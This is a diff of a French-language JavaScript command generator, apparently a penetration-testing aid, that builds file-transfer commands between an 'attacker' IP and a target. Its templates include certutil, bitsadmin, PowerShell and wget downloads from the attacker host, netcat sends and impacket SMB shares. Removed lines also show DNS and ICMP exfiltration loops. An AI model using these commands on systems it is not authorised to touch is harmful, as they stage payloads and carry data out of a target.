@@ -1,6 +1,6 @@
 // Configuration globale
 let globalConfig = {
-    attackerOS: 'kali',
+    attackerOS: 'unix',
     attackerIP: '10.10.14.1',
     listenPort: '8000',
     targetOS: 'linux',
@@ -16,7 +16,7 @@ document.addEventListener('DOMContentLoaded', function() {
     initializeEventListeners();
     loadHistory();
     updateAllCommands();
-    filterMethodsByOS();
+    filterAndUpdateMethods();
 });
 
 // Event listeners
@@ -34,28 +34,13 @@ function initializeEventListeners() {
     document.getElementById('resetConfig').addEventListener('click', resetConfig);
     document.getElementById('clearHistory').addEventListener('click', clearHistory);
     document.getElementById('exportHistory').addEventListener('click', exportHistory);
-    
-    // Language selector
-    const languageDropdown = document.getElementById('languageDropdown');
-    const languageMenu = document.getElementById('languageMenu');
-    
-    if (languageDropdown && languageMenu) {
-        languageDropdown.addEventListener('click', function(e) {
-            e.stopPropagation();
-            languageMenu.style.display = languageMenu.style.display === 'block' ? 'none' : 'block';
-        });
-        
-        document.addEventListener('click', function() {
-            languageMenu.style.display = 'none';
-        });
-    }
 }
 
 // Gestion des changements de configuration
 function handleConfigChange() {
     updateGlobalConfig();
     updateAllCommands();
-    filterMethodsByOS();
+    filterAndUpdateMethods();
     updateTargetPathPlaceholder();
 }
 
@@ -85,42 +70,26 @@ function getDefaultPath() {
 // Mettre à jour le placeholder du chemin de destination
 function updateTargetPathPlaceholder() {
     const targetPathInput = document.getElementById('targetPath');
-    if (targetPathInput && !targetPathInput.value) {
+    if (targetPathInput) {
         targetPathInput.placeholder = getDefaultPath();
+        if (!targetPathInput.value) {
+            globalConfig.targetPath = getDefaultPath();
+        }
     }
 }
 
-// Filtrer les méthodes selon l'OS cible
-function filterMethodsByOS() {
-    const targetOS = globalConfig.targetOS;
+// Filtrer et mettre à jour les méthodes selon les OS
+function filterAndUpdateMethods() {
+    const { attackerOS, targetOS } = globalConfig;
     const methodCards = document.querySelectorAll('.method-card');
+    
+    // Définir quelles méthodes sont disponibles pour chaque combinaison
+    const availableMethods = getAvailableMethodsForOS(attackerOS, targetOS);
     
     methodCards.forEach(card => {
         const method = card.dataset.method;
-        let shouldShow = true;
         
-        // Logique de filtrage selon l'OS
-        switch(method) {
-            case 'smb':
-                // SMB principalement pour Windows
-                shouldShow = targetOS === 'windows';
-                break;
-            case 'http':
-            case 'ftp':
-            case 'netcat':
-            case 'base64':
-            case 'dns':
-            case 'icmp':
-                // Ces méthodes fonctionnent sur tous les OS
-                shouldShow = true;
-                break;
-            case 'scp':
-                // SCP/SFTP principalement pour Linux/macOS
-                shouldShow = targetOS === 'linux' || targetOS === 'macos';
-                break;
-        }
-        
-        if (shouldShow) {
+        if (availableMethods.includes(method)) {
             card.style.display = 'block';
             card.style.animation = 'fadeInUp 0.6s ease-out';
         } else {
@@ -128,170 +97,195 @@ function filterMethodsByOS() {
         }
     });
     
-    // Mettre à jour le compteur de méthodes disponibles
     updateMethodsCounter();
+    filterCommandsByTargetOS();
+}
+
+// Filtrer les commandes selon l'OS cible
+function filterCommandsByTargetOS() {
+    const targetOS = globalConfig.targetOS;
+    
+    // Pour chaque méthode, filtrer les commandes selon l'OS cible
+    document.querySelectorAll('.command-variants').forEach(variants => {
+        const commandBlocks = variants.querySelectorAll('.command-block');
+        
+        commandBlocks.forEach(block => {
+            const label = block.querySelector('.command-label').textContent.toLowerCase();
+            let shouldShow = true;
+            
+            // Filtrer selon l'OS cible
+            if (targetOS === 'linux' || targetOS === 'macos') {
+                // Pour Linux/macOS, cacher les commandes Windows
+                if (label.includes('windows') || label.includes('powershell') || 
+                    label.includes('certutil') || label.includes('bitsadmin')) {
+                    shouldShow = false;
+                }
+            } else if (targetOS === 'windows') {
+                // Pour Windows, cacher les commandes Unix spécifiques
+                if (label.includes('linux') || label.includes('macos') || 
+                    (label.includes('wget') && !label.includes('windows')) ||
+                    (label.includes('curl') && !label.includes('windows'))) {
+                    shouldShow = false;
+                }
+            }
+            
+            block.style.display = shouldShow ? 'block' : 'none';
+        });
+    });
+}
+
+// Obtenir les méthodes disponibles selon les OS
+function getAvailableMethodsForOS(attackerOS, targetOS) {
+    const combinations = {
+        // Unix vers Linux
+        'unix-linux': ['http', 'scp', 'netcat', 'base64'],
+        
+        // Unix vers Windows
+        'unix-windows': ['http', 'smb', 'netcat', 'base64', 'ftp'],
+        
+        // Unix vers macOS
+        'unix-macos': ['http', 'scp', 'netcat', 'base64'],
+        
+        // Windows vers Linux
+        'windows-linux': ['http', 'netcat', 'base64', 'ftp'],
+        
+        // Windows vers Windows
+        'windows-windows': ['http', 'smb', 'netcat', 'base64', 'ftp'],
+        
+        // Windows vers macOS
+        'windows-macos': ['http', 'netcat', 'base64'],
+        
+        // macOS vers Linux
+        'macos-linux': ['http', 'scp', 'netcat', 'base64'],
+        
+        // macOS vers Windows
+        'macos-windows': ['http', 'smb', 'netcat', 'base64', 'ftp'],
+        
+        // macOS vers macOS
+        'macos-macos': ['http', 'scp', 'netcat', 'base64']
+    };
+    
+    const key = `${attackerOS}-${targetOS}`;
+    return combinations[key] || ['http', 'netcat', 'base64']; // Fallback
 }
 
 // Mettre à jour le compteur de méthodes
 function updateMethodsCounter() {
     const visibleMethods = document.querySelectorAll('.method-card[style*="block"]').length;
-    const totalMethods = document.querySelectorAll('.method-card').length;
     
-    // Ajouter un indicateur si il n'existe pas
     let counter = document.querySelector('.methods-counter');
     if (!counter) {
-        counter = document.createElement('p');
+        counter = document.createElement('div');
         counter.className = 'methods-counter';
         const methodsSection = document.querySelector('.methods-section');
         if (methodsSection) {
-            methodsSection.insertBefore(counter, methodsSection.querySelector('.method-card'));
+            const firstMethod = methodsSection.querySelector('.method-card');
+            if (firstMethod) {
+                methodsSection.insertBefore(counter, firstMethod);
+            }
         }
     }
     
     counter.innerHTML = `
-        <span class="counter-text">
-            ${visibleMethods} méthode${visibleMethods > 1 ? 's' : ''} disponible${visibleMethods > 1 ? 's' : ''} 
-            pour <strong>${getOSDisplayName(globalConfig.targetOS)}</strong>
-        </span>
+        <div class="counter-content">
+            <span class="counter-text">
+                <strong>${visibleMethods}</strong> méthodes disponibles
+            </span>
+            <span class="counter-subtitle">
+                ${getOSDisplayName(globalConfig.attackerOS)} → ${getOSDisplayName(globalConfig.targetOS)}
+            </span>
+        </div>
     `;
 }
 
 // Obtenir le nom d'affichage de l'OS
 function getOSDisplayName(os) {
-    const osNames = {
+    const names = {
+        'unix': '🐧 Unix/Linux',
         'linux': '🐧 Linux',
         'windows': '🪟 Windows',
         'macos': '🍎 macOS'
     };
-    return osNames[os] || os;
+    return names[os] || os;
 }
 
-// Mise à jour de toutes les commandes
+// Mise à jour de toutes les commandes avec les paramètres actuels
 function updateAllCommands() {
-    const { attackerOS, attackerIP, listenPort, fileName, targetPath, targetOS } = globalConfig;
+    const { attackerIP, listenPort, fileName, targetPath, targetOS } = globalConfig;
     
-    // Serveurs HTTP - adaptés selon l'OS attaquant
-    updateHTTPServerCommands(attackerOS, listenPort);
+    // Déterminer l'extension du chemin selon l'OS
+    const fullPath = targetOS === 'windows' 
+        ? (targetPath.endsWith('\\') ? targetPath + fileName : targetPath + '\\' + fileName)
+        : (targetPath.endsWith('/') ? targetPath + fileName : targetPath + '/' + fileName);
     
-    // Téléchargements HTTP - adaptés selon l'OS cible
-    updateHTTPDownloadCommands(attackerIP, listenPort, fileName, targetPath, targetOS);
+    // HTTP Server commands
+    updateCommand('httpServerPython3', `python3 -m http.server ${listenPort} --bind 0.0.0.0`);
+    updateCommand('httpServerPython2', `python -m SimpleHTTPServer ${listenPort}`);
+    updateCommand('httpServerPHP', `php -S 0.0.0.0:${listenPort}`);
+    updateCommand('httpServerRuby', `ruby -run -e httpd . -p ${listenPort}`);
+    updateCommand('httpServerNode', `npx http-server -p ${listenPort} --host 0.0.0.0`);
     
-    // Commandes FTP
-    updateFTPCommands(attackerIP, listenPort, fileName, targetPath);
-    
-    // Commandes SCP/SFTP
-    updateSCPCommands(attackerIP, fileName, targetPath);
-    
-    // Commandes Netcat
-    updateNetcatCommands(attackerIP, listenPort, fileName);
-    
-    // Commandes Base64
-    updateBase64Commands(fileName, targetOS);
-    
-    // Commandes SMB
-    updateSMBCommands(attackerIP, fileName, targetOS);
-    
-    // Exfiltration DNS
-    updateDNSCommands(attackerIP, fileName);
-    
-    // Exfiltration ICMP
-    updateICMPCommands(attackerIP, fileName);
-}
-
-// Mise à jour des serveurs HTTP selon l'OS attaquant
-function updateHTTPServerCommands(attackerOS, listenPort) {
-    const commands = {
-        'kali': `python3 -m http.server ${listenPort}`,
-        'ubuntu': `python3 -m http.server ${listenPort}`,
-        'arch': `python3 -m http.server ${listenPort}`,
-        'windows': `python -m http.server ${listenPort}`,
-        'macos': `python3 -m http.server ${listenPort}`
-    };
-    
-    updateElement('httpServerPython3', commands[attackerOS] || commands['kali']);
-    updateElement('httpServerPython2', `python -m SimpleHTTPServer ${listenPort}`);
-    updateElement('httpServerPHP', `php -S 0.0.0.0:${listenPort}`);
-    updateElement('httpServerRuby', `ruby -run -e httpd . -p ${listenPort}`);
-    updateElement('httpServerNode', `npx http-server -p ${listenPort}`);
-}
-
-// Mise à jour des téléchargements HTTP selon l'OS cible
-function updateHTTPDownloadCommands(attackerIP, listenPort, fileName, targetPath, targetOS) {
-    const fullPath = targetPath.endsWith('/') || targetPath.endsWith('\\') ? 
-                    `${targetPath}${fileName}` : `${targetPath}/${fileName}`;
+    // HTTP Client commands - filtrées selon l'OS cible
+    if (targetOS === 'linux' || targetOS === 'macos') {
+        updateCommand('httpClientWget', `wget "http://${attackerIP}:${listenPort}/${fileName}" -O "${fullPath}"`);
+        updateCommand('httpClientCurl', `curl -o "${fullPath}" "http://${attackerIP}:${listenPort}/${fileName}"`);
+    }
     
     if (targetOS === 'windows') {
-        updateElement('httpDownloadWget', `# wget non disponible sur Windows par défaut`);
-        updateElement('httpDownloadCurl', `curl -o "${fileName}" "http://${attackerIP}:${listenPort}/${fileName}"`);
-        updateElement('httpDownloadPowershell', `Invoke-WebRequest -Uri "http://${attackerIP}:${listenPort}/${fileName}" -OutFile "${fileName}"`);
-        updateElement('httpDownloadCertutil', `certutil -urlcache -split -f "http://${attackerIP}:${listenPort}/${fileName}" "${fileName}"`);
-    } else {
-        updateElement('httpDownloadWget', `wget "http://${attackerIP}:${listenPort}/${fileName}" -O "${fullPath}"`);
-        updateElement('httpDownloadCurl', `curl -o "${fullPath}" "http://${attackerIP}:${listenPort}/${fileName}"`);
-        updateElement('httpDownloadPowershell', `# PowerShell non disponible sur ${targetOS}`);
-        updateElement('httpDownloadCertutil', `# certutil non disponible sur ${targetOS}`);
+        updateCommand('httpClientPowershell', `Invoke-WebRequest -Uri "http://${attackerIP}:${listenPort}/${fileName}" -OutFile "${fullPath}"`);
+        updateCommand('httpClientCertutil', `certutil -urlcache -split -f "http://${attackerIP}:${listenPort}/${fileName}" "${fullPath}"`);
+        updateCommand('httpClientBitsadmin', `bitsadmin /transfer myDownloadJob /download /priority normal "http://${attackerIP}:${listenPort}/${fileName}" "${fullPath}"`);
+    }
+    
+    // SCP commands
+    updateCommand('scpToTarget', `scp "${fileName}" user@target_ip:"${fullPath}"`);
+    updateCommand('scpCustomPort', `scp -P 2222 "${fileName}" user@target_ip:"${fullPath}"`);
+    updateCommand('sftpInteractive', `sftp user@target_ip`);
+    
+    // Netcat commands
+    updateCommand('netcatSender', `nc -w 3 ${attackerIP} ${listenPort} < "${fileName}"`);
+    updateCommand('netcatReceiver', `nc -l -p ${listenPort} > "${fullPath}"`);
+    updateCommand('netcatReceiverTarget', `nc -l -p ${listenPort} > "${fullPath}"`);
+    updateCommand('netcatSenderAttacker', `nc target_ip ${listenPort} < "${fileName}"`);
+    
+    // Base64 commands
+    if (targetOS === 'linux' || targetOS === 'macos') {
+        updateCommand('base64Encode', `base64 -w 0 "${fileName}"`);
+        updateCommand('base64Decode', `echo "BASE64_STRING" | base64 -d > "${fullPath}"`);
+    }
+    
+    if (targetOS === 'windows') {
+        updateCommand('base64EncodeWin', `certutil -encode "${fileName}" encoded.txt`);
+        updateCommand('base64DecodeWin', `certutil -decode encoded.txt "${fullPath}"`);
+    }
+    
+    // FTP commands
+    updateCommand('ftpServerPython', `python3 -m pyftpdlib -p 21 -w`);
+    updateCommand('ftpServerAuth', `python3 -m pyftpdlib -p 21 -u user -P pass`);
+    
+    if (targetOS === 'linux' || targetOS === 'macos') {
+        updateCommand('ftpClientLinux', `wget ftp://${attackerIP}/${fileName} -O "${fullPath}"`);
+    }
+    
+    if (targetOS === 'windows') {
+        updateCommand('ftpClientWindows', `powershell -c "(New-Object Net.WebClient).DownloadFile('ftp://${attackerIP}/${fileName}', '${fullPath}')"`);
+    }
+    
+    // SMB commands (principalement pour Windows)
+    updateCommand('smbServer', `impacket-smbserver share . -smb2support`);
+    updateCommand('smbServerAuth', `impacket-smbserver share . -smb2support -user user -password pass`);
+    
+    if (targetOS === 'windows') {
+        updateCommand('smbCopy', `copy "\\\\${attackerIP}\\share\\${fileName}" "${fullPath}"`);
+        updateCommand('smbRobocopy', `robocopy "\\\\${attackerIP}\\share" "${targetPath}" "${fileName}"`);
     }
 }
 
-// Mise à jour des commandes FTP
-function updateFTPCommands(attackerIP, listenPort, fileName, targetPath) {
-    updateElement('ftpServer', `python3 -m pyftpdlib -p ${listenPort} -w`);
-    updateElement('ftpDownload', `ftp ${attackerIP} ${listenPort}`);
-}
-
-// Mise à jour des commandes SCP
-function updateSCPCommands(attackerIP, fileName, targetPath) {
-    updateElement('scpUpload', `scp "${fileName}" user@${attackerIP}:"${targetPath}"`);
-    updateElement('scpDownload', `scp user@${attackerIP}:"${targetPath}${fileName}" .`);
-    updateElement('sftpConnect', `sftp user@${attackerIP}`);
-}
-
-// Mise à jour des commandes Netcat
-function updateNetcatCommands(attackerIP, listenPort, fileName) {
-    updateElement('ncSender', `nc -l -p ${listenPort} < "${fileName}"`);
-    updateElement('ncReceiver', `nc ${attackerIP} ${listenPort} > "${fileName}"`);
-}
-
-// Mise à jour des commandes Base64
-function updateBase64Commands(fileName, targetOS) {
-    if (targetOS === 'windows') {
-        updateElement('base64Encode', `certutil -encode "${fileName}" encoded.txt`);
-        updateElement('base64Decode', `certutil -decode encoded.txt "${fileName}"`);
-    } else {
-        updateElement('base64Encode', `base64 -w 0 "${fileName}"`);
-        updateElement('base64Decode', `echo "PASTE_BASE64_HERE" | base64 -d > "${fileName}"`);
-    }
-}
-
-// Mise à jour des commandes SMB
-function updateSMBCommands(attackerIP, fileName, targetOS) {
-    updateElement('smbServer', `impacket-smbserver share . -smb2support`);
-    updateElement('smbServerAuth', `impacket-smbserver share . -smb2support -user test -password test`);
-    
-    if (targetOS === 'windows') {
-        updateElement('smbCopy', `copy "\\\\${attackerIP}\\share\\${fileName}" .`);
-        updateElement('smbRobocopy', `robocopy "\\\\${attackerIP}\\share" . "${fileName}"`);
-    }
-}
-
-// Mise à jour des commandes DNS
-function updateDNSCommands(attackerIP, fileName) {
-    updateElement('dnsServer', `sudo tcpdump -i any -s 0 port 53`);
-    updateElement('dnsExfil', `for i in $(base64 -w 0 "${fileName}" | fold -w 32); do nslookup $i.${attackerIP}; done`);
-}
-
-// Mise à jour des commandes ICMP
-function updateICMPCommands(attackerIP, fileName) {
-    updateElement('icmpListen', `sudo tcpdump -i any icmp`);
-    updateElement('icmpExfil', `xxd -p -c 16 "${fileName}" | while read line; do ping -c 1 -p $line ${attackerIP}; done`);
-}
-
-function updateElement(id, content) {
-    const element = document.getElementById(id);
+// Fonction utilitaire pour mettre à jour une commande
+function updateCommand(elementId, command) {
+    const element = document.getElementById(elementId);
     if (element) {
-        element.textContent = content;
-        
-        // Ajouter une classe pour indiquer que la commande a été mise à jour
+        element.textContent = command;
         element.parentElement.classList.add('updated');
         setTimeout(() => {
             element.parentElement.classList.remove('updated');
@@ -302,45 +296,38 @@ function updateElement(id, content) {
 // Génération de toutes les commandes
 function generateAllCommands() {
     updateAllCommands();
-    filterMethodsByOS();
     showNotification('Toutes les commandes ont été mises à jour!', 'success');
 }
 
 // Réinitialisation de la configuration
 function resetConfig() {
-    document.getElementById('attackerOS').value = 'kali';
-    document.getElementById('attackerIP').value = '10.10.14.1';
-    document.getElementById('listenPort').value = '8000';
+    document.getElementById('attackerOS').value = 'unix';
+    document.getElementById('attackerIP').value = '';
+    document.getElementById('listenPort').value = '';
     document.getElementById('targetOS').value = 'linux';
-    document.getElementById('fileName').value = 'exploit.sh';
-    document.getElementById('targetPath').value = '/tmp/';
+    document.getElementById('fileName').value = '';
+    document.getElementById('targetPath').value = '';
     
     handleConfigChange();
     showNotification('Configuration réinitialisée!', 'info');
 }
 
-// Copie de commande
+// Fonction de copie de commande
 function copyCommand(elementId) {
     const element = document.getElementById(elementId);
     if (!element) return;
     
     const command = element.textContent;
     
-    // Vérifier si c'est un commentaire (commande non disponible)
-    if (command.startsWith('#')) {
-        showNotification('Cette commande n\'est pas disponible pour l\'OS sélectionné', 'warning');
-        return;
-    }
-    
     navigator.clipboard.writeText(command).then(() => {
         // Ajouter à l'historique
         addToHistory(command);
         
-        // Animation du bouton
+        // Feedback visuel
         const copyBtn = element.parentElement.querySelector('.copy-btn');
         if (copyBtn) {
             const originalText = copyBtn.textContent;
-            copyBtn.textContent = '✅';
+            copyBtn.textContent = '✓';
             copyBtn.style.background = '#10b981';
             
             setTimeout(() => {
@@ -391,6 +378,7 @@ function updateHistoryDisplay() {
             <div class="history-empty">
                 <span class="empty-icon">📝</span>
                 <p>Aucune commande copiée pour le moment</p>
+                <p class="empty-subtitle">Les commandes que vous copiez apparaîtront ici avec leur contexte</p>
             </div>
         `;
         return;
@@ -398,10 +386,17 @@ function updateHistoryDisplay() {
     
     historyContainer.innerHTML = commandHistory.map((item, index) => `
         <div class="history-item" data-index="${index}">
-            <div class="history-command">${escapeHtml(item.command)}</div>
-            <div class="history-meta">
-                <div class="history-time">${item.timestamp}</div>
-                ${item.config ? `<div class="history-config">${item.config.targetOS} → ${item.config.attackerIP}</div>` : ''}
+            <div class="history-main">
+                <div class="history-command">${escapeHtml(item.command)}</div>
+                <div class="history-meta">
+                    <div class="history-time">${item.timestamp}</div>
+                    ${item.config ? `
+                        <div class="history-config">
+                            ${getOSDisplayName(item.config.attackerOS)} → ${getOSDisplayName(item.config.targetOS)} 
+                            | ${item.config.fileName} → ${item.config.targetPath}
+                        </div>
+                    ` : ''}
+                </div>
             </div>
             <button class="copy-btn" onclick="copyFromHistory('${escapeHtml(item.command)}')">📋</button>
         </div>
@@ -430,7 +425,7 @@ function exportHistory() {
     }
     
     const exportData = commandHistory.map(item => 
-        `[${item.timestamp}] ${item.command}${item.config ? ` (${item.config.targetOS} → ${item.config.attackerIP})` : ''}`
+        `[${item.timestamp}] ${item.command}${item.config ? ` (${getOSDisplayName(item.config.attackerOS)} → ${getOSDisplayName(item.config.targetOS)}: ${item.config.fileName})` : ''}`
     ).join('\n');
     
     const blob = new Blob([exportData], { type: 'text/plain' });
@@ -489,10 +484,10 @@ function showNotification(message, type = 'info') {
                 document.body.removeChild(notification);
             }
         }, 300);
-    }, 3000);
+    }, 4000);
 }
 
-// Styles pour les animations
+// Styles pour les animations et améliorations
 const style = document.createElement('style');
 style.textContent = `
     @keyframes slideIn {
@@ -515,17 +510,41 @@ style.textContent = `
     }
     
     .methods-counter {
-        color: var(--text-secondary);
-        font-size: 0.875rem;
-        margin-bottom: 1.5rem;
-        padding: 0.75rem 1rem;
-        background: var(--bg-secondary);
+        background: linear-gradient(135deg, rgba(99, 102, 241, 0.1), rgba(139, 92, 246, 0.1));
+        border: 1px solid rgba(99, 102, 241, 0.2);
         border-radius: var(--border-radius);
-        border-left: 4px solid var(--primary-color);
+        padding: 1.5rem;
+        margin-bottom: 2rem;
+        text-align: center;
+    }
+    
+    .counter-content {
+        display: flex;
+        flex-direction: column;
+        gap: 0.5rem;
+    }
+    
+    .counter-text {
+        font-size: 1rem;
+        font-weight: 600;
+        color: var(--text-primary);
+    }
+    
+    .counter-subtitle {
+        font-size: 0.875rem;
+        color: var(--text-secondary);
+        opacity: 0.8;
     }
     
     .counter-text strong {
-        color: var(--text-primary);
+        color: var(--primary-color);
+    }
+    
+    .history-main {
+        flex: 1;
+        display: flex;
+        flex-direction: column;
+        gap: 0.5rem;
     }
     
     .history-meta {
@@ -535,9 +554,16 @@ style.textContent = `
     }
     
     .history-config {
-        font-size: 0.7rem;
+        font-size: 0.75rem;
         color: var(--text-tertiary);
         opacity: 0.8;
+        font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+    }
+    
+    .empty-subtitle {
+        font-size: 0.875rem;
+        opacity: 0.7;
+        margin-top: 0.5rem;
     }
 `;
 document.head.appendChild(style); 
